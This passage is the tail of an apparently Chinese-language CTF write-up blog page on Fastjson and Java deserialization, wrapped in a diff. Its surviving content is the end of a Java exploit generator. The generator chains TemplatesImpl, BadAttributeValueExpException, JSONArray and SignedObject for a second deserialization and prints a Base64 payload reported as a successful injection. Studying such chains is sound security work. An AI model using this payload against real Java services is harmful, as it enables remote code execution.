+</span></span><span class="line"><span class="cl">        <span class="n">JSONArray</span> <span class="n">jsonArray2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONArray</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//此时在handles这个hash表中查到了映射，后续则会以引用形式输出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">jsonArray2</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>           
+</span></span><span class="line"><span class="cl">        <span class="n">BadAttributeValueExpException</span> <span class="n">bd2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">bd2</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">,</span><span class="n">jsonArray2</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">bd2</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//二次反序列化
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">((</span><span class="n">Serializable</span><span class="o">)</span> <span class="n">list</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//触发SignedObject#getObject
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">JSONArray</span> <span class="n">jsonArray1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONArray</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">jsonArray1</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">signedObject</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">        <span class="n">BadAttributeValueExpException</span> <span class="n">bd1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">bd1</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">,</span><span class="n">jsonArray1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">				<span class="c1">//输出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">serialize</span><span class="o">(</span><span class="n">bd1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">encodeBase64String</span><span class="o">(</span><span class="n">payload</span><span class="o">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>成功注入</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205013-3.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205013-3.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="参考资料">参考资料</h2>
+<p>[1] <a class="link" href="https://xz.aliyun.com/t/12606"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/12606</a></p>
+<p>[2] <a class="link" href="https://xz.aliyun.com/t/12085"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/12085</a></p>
+<p>[3] <a class="link" href="https://www.javasec.org/java-vuls/FastJson.html"  target="_blank" rel="noopener"
+    >https://www.javasec.org/java-vuls/FastJson.html</a></p>
+<p>[4] <a class="link" href="https://www.cnblogs.com/zpchcbd/p/15545773.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/zpchcbd/p/15545773.html</a></p>
+<p>[5] <a class="link" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/"  target="_blank" rel="noopener"
+    >https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p>
+<p>[6] <a class="link" href="https://www.freebuf.com/articles/web/365636.html"  target="_blank" rel="noopener"
+    >https://www.freebuf.com/articles/web/365636.html</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java/">Java</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JAVA入门到放弃系列之Jackson反序列化(一)</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JAVA入门到放弃系列之JDBC反序列化</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JAVA入门到放弃系列之Fastjson反序列化(一)</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2023 Kleinor
+    </section>
+    
+    <section class="powerby">
+         <br />
+        
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#概要">概要</a></li>
+    <li><a href="#前置知识">前置知识</a>
+      <ol>
+        <li><a href="#templatesimpl利用链">TemplatesImpl利用链</a></li>
+        <li><a href="#badattributevalueexpexceptionjdk18引入">BadAttributeValueExpException(jdk1.8引入)</a></li>
+        <li><a href="#jsonarrayjsonobject">JSONArray/JSONObject</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezbean">ezbean</a></li>
+    <li><a href="#easy-expr">Easy expr</a></li>
+    <li><a href="#参考资料">参考资料</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+
+</script>
+
+<a href="#" id="back-to-top" title="返回顶部"></a>
+
+
+<style>
+  #back-to-top {
+    display: none;
+    position: fixed;
+    bottom: 20px;
+    right: 55px;
+    width: 55px;
+    height: 55px;
+    border-radius: 7px;
+    background-color: rgb(246, 241, 241);
+    box-shadow: var(--shadow-l2);
+    font-size: 30px;
+    text-align: center;
+    line-height: 50px;
+    cursor: pointer;
+  }
+
+  #back-to-top:before {
+    content: ' ';
+    display: inline-block;
+    position: relative;
+    top: 0;
+    transform: rotate(135deg);
+    height: 10px;
+    width: 10px;
+    border-width: 0 0 2px 2px;
+    border-color: var(--back-to-top-color);
+    border-style: solid;
+  }
+
+  #back-to-top:hover:before {
+    border-color: #2674e0;
+  }
+
+   
+  @media screen and (max-width: 768px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 20px;
+      width: 40px;
+      height: 40px;
+      font-size: 10px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1024px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 40px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1280px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 55px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1536px) {
+    #back-to-top {
+      visibility: hidden;
+    }
+  }
+</style>
+
+
+<script>
+  function backToTop() {
+    document.documentElement.scrollIntoView({
+      behavior: 'smooth',
+    })
+  }
+
+  window.onload = function () {
+    let scrollTop =
+      this.document.documentElement.scrollTop || this.document.body.scrollTop
+    let totopBtn = this.document.getElementById('back-to-top')
+    if (scrollTop > 0) {
+      totopBtn.style.display = 'inline'
+    } else {
+      totopBtn.style.display = 'none'
+    }
+  }
+
+  window.onscroll = function () {
+    let scrollTop =
+      this.document.documentElement.scrollTop || this.document.body.scrollTop
+    let totopBtn = this.document.getElementById('back-to-top')
+    if (scrollTop < 200) {
+      totopBtn.style.display = 'none'
+    } else {
+      totopBtn.style.display = 'inline'
+      totopBtn.addEventListener('click', backToTop, false)
+    }
+  }
+</script>
+    </body>
+</html>
